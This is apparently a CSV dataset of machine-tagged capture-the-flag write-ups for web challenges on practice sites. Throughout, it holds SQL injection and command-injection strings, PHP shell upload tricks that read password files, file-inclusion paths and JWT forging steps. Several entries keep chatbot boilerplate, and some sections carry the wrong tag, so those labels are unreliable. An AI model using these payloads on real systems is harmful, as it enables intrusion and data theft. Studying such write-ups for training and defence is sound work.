"filename","category","text"
"39_Irish-Name-Repo_3_tagged.txt","Web Exploitation","Title: Irish-Name-Repo 3
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: encryption, Caesar cipher

#context
Once again we are brought back to what seems like the same page as in Irish-Name-Repo 1 and 2. Except this time, when we enter a SQL Injection such as ' or 1=1--, we get a server-side HTTP error 500. We also note that there is now only a password input, so no way of revealing anything... or is there?

#discovery
When we inspect element this page, we can notice that there is more than one input, just that one of them is hidden and set to 0. If we set this to 1, we can actually see the query we are inputting after the encryption that messes up our injections occurs.

#exploitation
This time, when we inject the same injection ' or 1=1--, we get back our encrypted query. In which we can see that the alphabetical characters 'o' and 'r' have been swapped to a 'b' and 'e'. Curious. Let's try putting every letter in the alphabet after the comment to see exactly what type of encryption this is while setting the hidden input to 1 still. We can now confirm that this is some type of Caesar cipher. The characters for the word OR are substituted for BE. We try our query again, this time following the encryption, as so: ' be 1=1--. The portal lets us through, and we finally see our flag.

#code
`' be 1=1--`
"
"40_JaWT_Scratchpad_tagged.txt","Web Exploitation","Title: JaWT Scratchpad
Primary topic: Web Exploitation
Secondary topic: JWT
Tools used: hashcat

#context
The challenge involves a web application that uses JWT for authentication.

#discovery
The first step is to log in as any user and obtain the JWT token from the jwt cookie.

#exploitation
Next, we use hashcat to crack the token and obtain the password used. We then change the ""user"" in the JWT payload to ""admin"" and sign it again using the password found.

#code
`hashcat -m 16500 token.txt rockyou.txt`

#countermeasures
This challenge highlights the importance of properly securing JWT tokens and avoiding common vulnerabilities such as weak passwords. It also emphasizes the need for proper access control and user authentication mechanisms.
"
"41_Java_Script_Kiddie_tagged.txt","Web Exploitation","Title: Java Script Kiddie
Primary topic: Web Exploitation
Secondary topic: Cryptography
Tools used: jQuery, zbar
Keywords: PNG, bytes, key, QRCode

#context
Get a look at the webpage source code.

#discovery
Run:
```
$.get(""bytes"", function(resp) {bytes = Array.from(resp.split("" ""), x => Number(x));});
```
from the source code in developer console to get a list of bytes.

#exploitation
The website takes the above list of bytes and shifts them based on the key the user enters. For each character in the key, the script shifts every 16th byte starting with byte i, where i is the index of the character in the key. In this way, the first 16 bytes of the image correspond to the 16 digits in the user-specified key.

#code
I used a script that, for each character of the key, will try all digits until one is found that places the expected value in the current location.

#countermeasures
Enter key into website and save the QRCode PNG image.

#code
Use zbar on the image to get the flag."
"42_Java_Script_Kiddie_2_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Java Script Kiddie 2
Primary topic: Web Exploitation
Secondary topic: JavaScript
Tools used: None
Keywords: webpage source code, developer console, bytes, key, QRCode, zbar

#context
Get a look at the webpage source code.

#discovery
Run
```
$.get(""bytes"", function(resp) {bytes = Array.from(resp.split("" ""), x => Number(x));});
```
from the source code in developer console to get a list of bytes.

#context
This website is similar to the first ""Java Script Kiddie"" except for a line that effectively ignores every second value in the key.

#exploitation
Since var LEN = 16 is the same, the script for the previous challenge can be used again but with a random value (I chose 0) added between character.

#code
So, the script used, for each character of the key, will try all digits until one is found that places the expected value in the current location. It also adds padding (0) after each digit found.

#countermeasures
Enter key into website and save the QRCode PNG image.

#discovery
Use zbar on the image to get the flag.
```"
"01_open-to-admins_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: open-to-admins
Primary topic: Web Exploitation
Secondary topic: None
Tools used: Firefox extension (Cookie Manager)
Keywords: cookies, admin, time

#context
After a ton of research and testing, I found out that it was a lot easier than I thought.

#discovery
You have to modify the cookies and add 2 fields: admin and time. (I used a Firefox extension called Cookie Manager).

#countermeasures
None

#code
None
```

Please let me know if you have any further questions or if there's anything else I can help you with.
"
"02_Empire1_tagged.txt","Web Exploitation","Title: Empire1
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: sqli, query injection, dbms

#context
First thing we notice when we open the homepage is register and login pages, but they doesn't seem to be vulnerable to SQL injection. So we create a user and we login.

#discovery
Let's see that create todo page, if we try to inject a simple ' in the todo we get an internal server error, so we know that probably we can inject SQL. In fact, if we try a simple a' OR '1'='1, the query is executed, and in the todo list, we can see the output 1.

#exploitation
If we play a little with queries, we will find that a good method to inject a query is this a' || (some_query) || 'b.

#discovery
Now we have to find some info about the DBMS. In order to do that, we have to understand which DBMS is being used. We try to select information_schema, which is MySQL, but it won't work. If we try sqlite_master, it will work, so we print some information, and then we can start printing the good stuff.

#exploitation
The challenge description clearly says us to find our secret. So if we print the secret ""column"" of every user selected by his id, we are gonna find ours and with it our flag.

#code
None

#countermeasures
None"
"03_Empire2_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Empire2
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: flask, cookies, session

#context
First of all let's register and login, then we try to create a todo with {{config}} and we can see in the list of todos a lot of information about the flask server.

#discovery
We can see the secret key to sign cookies.

#discovery
Get the flask session cookie encoded.

#exploitation
And if we decode it with flask-session-cookie-manager we actually find our flag.
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"04_Empire3_tagged.txt","Web Exploitation","Title: Empire3
Primary topic: Web Exploitation
Secondary topic: Flask Secret Key
Tools used: flask-session-cookie-manager
Keywords: cookies, user_id

#context
We are presented the usual company website, we register and login as usual and we try to add a todo {{config}}.

#discovery
We go in the list of todos and we have a lot of information, the most important is the flask secret key which is used to sign the cookies.

#discovery
Now we check if there is any cookie saved by the website and we find that there is one.

#exploitation
Decrypting it with flask-session-cookie-manager we discover that it contains a user_id field, maybe we can change it and login as another user.

#exploitation
We try set user_id to 1 and we encode the cookie again. As we send the cookie we actually login as jarret.booz but no flag here.

#exploitation
Let's try user_id = 2 and we actually find the flag.

#countermeasures
This challenge highlights the importance of properly securing session management and cookie handling in web applications. It also emphasizes the need for secure coding practices to prevent vulnerabilities such as this one."
"05_cereal_hacker_1_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: cereal hacker 1
Primary topic: Web Exploitation
Secondary topic: Credential Bruteforcing
Tools used: Hydra, Firefox, CyberChef
Keywords: cookies, base64 encoding

#context
It will be foundamental later. After a ton of guessing and a little hint from the official discord page of picoCTF we found that the credentials to log in as a regular user were: username=guest and password=guest. The really intresting part in this page are the cookies, in fact there is a new cookie base64 encoded called user_info.

#discovery
Credential bruteforcing: The credentials can be found with hydra and the http[s]-{get|post}-form module. The user= and pass= are the post variables found from the debugging console in Firefox.

#exploitation
Login as guest:guest. Get cookie. URL and Base64Decode using CyberChef. Change the cookie. Encoding using CyberChef. Set cookie to new cookie. Change URL to file=admin. You got the flag.

#code
N/A

#countermeasures
N/A
```"
"01_HTML_Code_source_tagged.txt","Web Exploitation","Title: None
Primary topic: None
Secondary topic: None
Tools used: None
Keywords: None

#context
By showing the source code HTML of the page, we found this comment.

#code
<!--
Je crois que c'est vraiment trop simple la !
password : xxx
-->
"
"02_HTTP_IP_restriction_bypass_tagged.txt","Web Exploitation","Title: Bypassing IP Filtering with HTTP Headers Injection
Primary topic: Web Exploitation
Secondary topic: HTTP Headers Injection
Tools used: cURL
Keywords: IP filtering, load-balancer, proxy

#overview
Only local users will be able to access the page

---

#analysis
In this challenge we will study the bypassing of IP filtering by a well-known technique of HTTP headers injection. Some of these headers allow you to specify that the clients IP address is different from the source IP address in the packet received by the server. These headers are particularly useful when the connections go through a load-balancer or a proxy. However we can also use these headers to indicate the IP we want. 

#attack_execution
So we will try request with CURL and this HTTP header!

#code
curl 'http://challenge01.root-me.org/web-serveur/ch68/' --header 'X-Forwarded-For: 192.168.1.1'

#exploitation
And we get :

Well done validation password is : <strong>FLAGFLAGFLAGFLAGFLAGFLAG</strong>

---

#countermeasures
To prevent HTTP headers injection attacks, it's important to sanitize and validate all user input, including HTTP headers. Additionally, web application firewalls (WAFs) can be used to detect and block malicious requests that contain suspicious headers."
"03_HTTP_Open_redirect_tagged.txt","Web Exploitation","Title: None
Primary topic: Web Exploitation
Secondary topic: None
Tools used: Tamper Data, Online MD5 hash converter
Keywords: md5 hash, redirect, tampering

#context
Check source code. You can see that when an option is selected, you are redirected to, for example, https://facebook.com&h=......&#8230;.

#discovery
We need to figure out what the value followed by &h= is, so we can structure our redirect url accordingly. Using an online md5 hash to text converter, we see the value represents the hashed value of the particular url. MD5 hash https://google.com&#8217; and note the value.

#exploitation
Start tamper data and click the facebook link. Edit the url so the website redirects to ?url=https://google.com&h=<MD5hash of https://google.com>&#8217; instead of facebook. Then submit the page.

#code
None

#countermeasures
None"
"04_HTTP_User-agent_tagged.txt","Web Exploitation","Thank you for providing the writeup text. Here is the tagged version of the writeup:

```
Title: None
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: user-agent

#exploitation
User tamper data to change the user-agent from its original value to admin.
```

Please let me know if you have any further questions or if you'd like me to tag any other writeups."
"05_Weak_password_tagged.txt","Web Exploitation","Here's the tagged version of the writeup text you provided:

```
Title: Guessing Credentials
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: credentials, guessing

#exploitation
Guess the credentials. After guessing, the credentials end up being:
username: admin password: admin
The password to complete the level is admin.
```

Please let me know if this meets your requirements."
"06_PHP_Command_injection_tagged.txt","Web Exploitation","Title: Command Injection via IP Address Field
Primary topic: Web Exploitation
Secondary topic: Command Injection
Tools used: None
Keywords: IP addresses, shell command, sanitization, index.php, cat, grep

#context
The first thing we see is a text field that accepts IP addresses, pings them, and returns the output as if it was a shell command.

#discovery
Seeing the output look like it came from a unix shell, trying to put commands such as ls sounds like a good idea, but there seems to be some sanitization. To get around this, you can put in an IP address, along with another command using the & symbol.

#exploitation
In the description of the challenge, it says the flag is in the index.php file, but if you look at the source code of the page, theres nothing there. Assuming that file is on the compromised service, we can inject a command to cat the file, and grep for the flag. The command I used was: 127.0.0.1 & cat index.php | grep flag

#code
`127.0.0.1 & cat index.php | grep flag`

#countermeasures
None provided."
"07_Backup_file_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Vim Backup File Password Retrieval
Primary topic: Web Exploitation
Secondary topic: Improper Input Sanitization
Tools used: None
Keywords: vim, backup files

#context
This one is a bit trickier. You are given a username and password field, but the intended solution doesnt include any improper text sanitization.

#discovery
If you are a vim god, you would know that vim backup files are stored as the original name of the file, with a tilde character at the end of the filename.

#exploitation
Knowing this, just navigate to /index.php~, and download the file. There, you will find the password.

#countermeasures
None
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"08_HTTP_Directory_indexing_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Password Directory Subdirectory Trick
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: password, subdirectory

#context
This challenge provides you with the supposed directory for the password in the source code of the page. However, if you visit the page, theres nothing there.

#discovery
If you go back and pay closer attention to the directory they gave you, it turns out to be a subdirectory, with the root directory being /admin. Navigate to /admin and youll be able to see more files.

#exploitation
The password should be in /admin/backup/admin.txt.

#countermeasures
None
```"
"09_HTTP_Headers_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Changing HTTP Headers
Primary topic: Web Exploitation
Secondary topic: HTTP Headers
Tools used: cURL
Keywords: headers

#context
From the challenge name, we assume that it has something to do with the headers.

#discovery
To get the headers of the web page, we can use a curl command:
curl --head http://challenge01.root-me.org/web-serveur/ch5/

#exploitation
Now we know what the headers are, we can change them using the curl command:
curl --include --header ""Header-RootMe-Admin: Administrator"" http://challenge01.root-me.org/web-serveur/ch5/

#countermeasures
None

#code
None
```"
"10_HTTP_POST_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Bypassing Score Validation in a Web Game
Primary topic: Web Exploitation
Secondary topic: POST Request
Tools used: cURL
Keywords: POST request, score validation

#context
With this challenge, we are greeted with a fun little game that generates a random number every time you click the button.

#discovery
After seeing the source code, we see that the button sends a POST request with two values: generate and score.

#exploitation
We can use cURL to send a POST request with a score over 999999 (If you send a POST request with just a score parameter, it wont work, make sure to include the generate value as well). We can use the cURL command:
curl --request POST --form 'generate=Give+a+try%21' --form 'score=1000000' http://challenge01.root-me.org/web-serveur/ch56/

#code
curl --request POST --form 'generate=Give+a+try%21' --form 'score=1000000' http://challenge01.root-me.org/web-serveur/ch56/
```

I hope this meets your requirements. Let me know if you have any further questions or concerns."
"11_HTTP_Improper_redirect_tagged.txt","Web Exploitation","Title: Bypassing Authentication with URI Manipulation
Primary topic: Web Exploitation
Secondary topic: Authentication Bypass
Tools used: Burp Suite, ZAP proxy, cURL
Keywords: URI manipulation, intercepting server responses

#context
We start the challenge with a login portal that says were not authenticated and cant view this page (take note of the URI).

#discovery
If you change the URI to contain index.php, it will quickly go to that page, and redirect back to the one we started at. You can use burp suite, ZAP proxy, or curl to capture the request. I used the curl command:
curl ""http://challenge01.root-me.org/web-serveur/ch32/index.php""

#discovery
If you want to do the challenge properly, you can use burp suite or any other program that intercepts server responses. When in burp suite, go the proxy tab, and then options tab, and enable Intercept Server Responses (this is off by default).

#exploitation
Then, turn on intercept and request the same webpage as we did in the curl command above. Forward the requests until you get a response, it should be an HTTP 302 Found response. Change the code to 200 OK and forward the response to your browser, you should get a web page with the flag.

#code
None

#countermeasures
None"
"12_HTTP_Verb_tampering_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: HTTP Verb Tampering
Primary topic: Web Exploitation
Secondary topic: Input Validation
Tools used: cURL
Keywords: HTTP methods, credentials

#context
When visiting the web page for this challenge, we are asked for credentials.

#exploitation
However, the intended solution for this challenge is not to manipulate input sanitization, but to tamper with different HTTP methods, called verb tampering.

#discovery
We can use curl commands to request the web page with different verbs, and find the password. We can use this curl command to get the password (other verbs also yield the same result).
curl --request PUT http://challenge01.root-me.org/web-serveur/ch8/

#code
curl --request PUT http://challenge01.root-me.org/web-serveur/ch8/

#countermeasures
```

Please let me know if you have any questions or if there's anything else I can help you with."
"13_Install_files_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Blank HTML Page
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: phpbb, install file

#context
We start with a blank and empty HTML page.

#context
Looking at the description of the challenge hints at the use of the phpbb software.

#discovery
Looking at the documentation of the software, we see that an install file is in the directory phpbb/install/install.php.

#exploitation
Go to this directory and you will get the password.

#code
None

#countermeasures
None
```"
"15_File_upload_Double_extensions_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: PHP Shell Upload
Primary topic: Web Exploitation
Secondary topic: File Upload
Tools used: None
Keywords: php, file extension, command injection

#context
Referring to the documentation provided along with this challenge, I wrote a quick php script and saved it as php_shell.php.jpg.

#exploitation
Sometimes you can trick the web server into accepting your php file by adding an acceptable file extension (jpg, png, gif) to the end of the php file extension. After uploading the file, we navigate to it and inject our command into the url. .....php_shell.php.jpg?command=cat ../../../.passwd

#code
None

#countermeasures
None
```

Please let me know if you have any questions or if there's anything else I can help you with."
"16_File_upload_MIME_type_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Uploading PHP Shell Script as JPEG
Primary topic: Web Exploitation
Secondary topic: File Upload Vulnerability
Tools used: Burp Suite
Keywords: content-type, injection

#context
For this challenge, we use burp to capture the post request sent to the server when trying to upload our php shell script and change the content-type from application/x-php to image/jpeg. This will trick the server into accepting the upload, thinking its a jpg file.

#exploitation
Click icon on our file and, like before, inject our command into the url:
http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/gsejso5erm5ahvm8i561a9tdh7//shell.php?command=cat%20../../../.passwd

#code
cat ../../../.passwd
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"17_HTTP_Cookies_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Solving a Web Server Challenge
Primary topic: Web Exploitation
Secondary topic: None
Tools used: Firefox, Live HTTP Headers
Keywords: cookie, admin access

#context
This challenge really irritated me because it took me 3 different plugins to find one that would work. Once I did, solving the challenge is a no-brainer.

#discovery
Click on saved email addresses, we get an error that says we must be admin. Checking the url: http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur. But simply replacing visiteur with admin we get an error that says theres an issue with the cookie value.

#discovery
Install the firefox plugin Live HTTP Headers and click the Saved email addresses link again. In live http headers, you can see the cookie: ch7=visiteur.

#exploitation
Click replay and change visiteur to admin, then replay again. In the browser click the link once more to find the validation password.

#countermeasures
None

#code
None
```"
"18_Insecure_Code_Management_tagged.txt","Web Exploitation","Title: Git Version Control and Sensitive Information Exposure
Primary topic: Web Exploitation
Secondary topic: Git Version Control
Tools used: wget, HTTrack, git, gittyleaks
Keywords: API keys, passwords, hard-coded, .git directories, commits, MD5 hash, config.php file

#context
Insecure code management is when part of the code exposes sensitive information which shouldnt be exposed to the world. Here we will cover the part of Git version control feature and how attackers can gain sensitive information if it is exposed in .git directories of the webservers.

#context
This Challenge will present you with a web-App. There is not much information on the first page and it will ask you to enter login information.

#discovery
A quick check will give you /.git. You can use wget or HTTrack to download the files and sub-directories. Once downloaded, go to the .git directory and check the git log, that will give you information on the commits that has happened and gives you a history of the changes that has been done to the repository.

#discovery
Now, we know changes has been made on the passwords and also that the password is in MD5 hash. Lets check the change status by using command : git status. The file config.php and index.php are the once that are deleted. Mostly when setting up a webApp, the DB passwords and the application passwords are stored in the config.php file. What we need to do now is to either restore this file or to checkout these files.

#exploitation
The next command I have used is : git restore config.php which gave me the required password. The above hash can be checked against MD5 decryptor and we can get the relevant string.

#code
`git restore config.php`

#countermeasures
The above approach is a manual one can be automated with plenty of tools out there. But the one I found pretty useful in such scenarios is gittyleaks. To make use of this tool, all you require"
"20_Directory_traversal_tagged.txt","Web Exploitation","Title: Hidden Folder and Password Retrieval
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: galerie, hidden folder, password retrieval

#context
We have a URL that displays different categories using the parameter 'galerie'. The URL is http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes.

#discovery
We can deduce that 'galerie' holds all the files. Navigating to http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=, we can see a hidden folder beginning with '86hv'. 

#discovery
To get the full folder name, move your mouse above the icon and right-click, then select 'inspect element'. 

#discovery
Navigate to http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r, and you'll see a file named 'password.txt'. 

#exploitation
Right-click and view the source code. Click the 'password.txt' hyperlink for the password. 

#code
None

#countermeasures
This challenge highlights the importance of proper access control and directory traversal protection to prevent unauthorized access to sensitive files."
"21_File_upload_Null_byte_tagged.txt","Web Exploitation","Here's the tagged version of the writeup text you provided:

```
Title: Renaming a Shell to Bypass File Upload Restrictions
Primary topic: Web Exploitation
Secondary topic: File Upload Restrictions
Tools used: None
Keywords: nullbyte

#context
Passing this level is super easy. Use the same shell as before.

#exploitation
Say the file name of your shell is shell.php. Rename it to shell.php%00.jpg. When submitted, the .jpg file extension will be dropped due to the preceding nullbyte. Once the file has uploaded, click it.

#countermeasures
This challenge demonstrates the importance of properly validating file extensions and content types during file uploads. Developers should also consider implementing additional security measures, such as file size limits and virus scanning, to prevent malicious files from being uploaded to their web applications.
```"
"26_PHP_Filters_tagged.txt","Web Exploitation","Title: PHP Filters for Input Validation
Primary topic: Web Exploitation
Secondary topic: PHP Filters
Tools used: None
Keywords: input validation, sanitize, filters, base64 encoding

#context
PHP filters are used to validate and sanitize external input. There are a number of filters that can be applied.

#exploitation
One built-in filter is convert.base64-encode and convert.base64-decode, the former of which will be used in this exploit. It will go like php://filter/convert.base64-encode. php://filter/convert.base64-encode/resource allows us to read any source of a PHP file. It forces PHP to base64 encode the file before it is used in the require statement. From there, decoding the base64 string will give us the source code for whichever PHP file is called by parameter resource. We continue guessing helpful PHP files such as config.php.

#code
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php

#countermeasures
It's important to use input validation and sanitization techniques to prevent attacks like this. Developers should be aware of the available filters and use them appropriately to ensure the security of their web applications."
"27_PHP_register_globals_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Backup File Disclosure
Primary topic: Web Exploitation
Secondary topic: Backup File Disclosure
Tools used: None
Keywords: backup files

#context
It seems that the developer often leaves backup files around.

#exploitation
Bypass with PHP register globals ?_SESSION[logged]=1
http://challenge01.root-me.org/web-serveur/ch17?_SESSION[logged]=1
well done, you can validate with the password.

#countermeasures
None
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"30_File_upload_ZIP_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Zip File Upload Vulnerability
Primary topic: Web Exploitation
Secondary topic: File Upload
Tools used: Kali Linux, zip command

#context
There is a zip file upload.

#discovery
I wrote a .php file, compressed to .zip file, uploaded.

#countermeasures
Report 403 code, because the php file cannot be accessed, only txt/jpg can be.

#exploitation
Create a soft link in kali to a .txt file, and then use the zip command compression symbol link file. Uploaded.

#discovery
Found that the .txt file is larger in size, clicking on the .txt file we'll get the index.php code.
```

I hope this meets your requirements. Let me know if you have any further questions or concerns."
"33_JSON_Web_Token_(JWT)_Public key_tagged.txt","Web Exploitation","Title: Accessing /admin endpoint with JWT Attack
Primary topic: Web Exploitation
Secondary topic: JWT Attack
Tools used: Python

#context
You find an API with 3 endpoints:
/key (accessible with GET)
/auth (accessible with POST)
/admin (accessible with POST)

#discovery
There is sure to be important data in the /admin endpoint, I have to access it.
I get a public key in the /key endpoint and I bring it to the human format.
I get the JWT in the /auth endpoint.

#exploitation
After reading a little, I came to the conclusion that it is necessary to send a token signed by the received public key (alg: RSA) while the server is waiting for a token with the signature HMAC (HS256/HS512).
The HS256 algorithm uses the secret key (Secret Key) to sign and authenticate the token's Header and Payload.
If the signature algorithm is changed from RS256 to HS256, On the authentication server, use the public key (Public Key) as the secret key (Secret Key) and use the HS256 algorithm to confirm the signature. In these cases, the attacker gets the public key (Public Key) to sign the token and verify the signature with the HS256 algorithm to make a JWT Attack.
Thanks to this, the server will automatically accept my token, I try to create and sign a token in python.
I get the token which I need to send.
I send the signed token.

#code
[Python code to create and sign the token]
"
"34_Local_File_Inclusion_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: LFI to Find Admin Page
Primary topic: Web Exploitation
Secondary topic: Local File Inclusion
Tools used: None
Keywords: admin page, directory listing, file viewer, string search

#context
We must search admin page/directory via LFI (Local file Inclusion).
http://challenge01.root-me.org/web-serveur/ch16/?files=..//

#discovery
The directory is listing our admin directory, now view the content of file index.php with File viewer.
http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php

#exploitation
Search for this string: 
$users = array('admin' => 'OpbNJ60xYpvAQU8');

#code
$users = array('admin' => 'OpbNJ60xYpvAQU8');
 
#countermeasures
None mentioned in the writeup.
```"
"68_SQL_injection_Time_based_tagged.txt","Web Exploitation","Title: SQL injection - Time based
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: SQLMap
Keywords: None

#discovery
Load the URL in SQLMap.

#discovery
Then find the current db.
Find the tables from DB public.
Get the columns from users table.

#exploitation
Let's dump it! Flag gained.
"
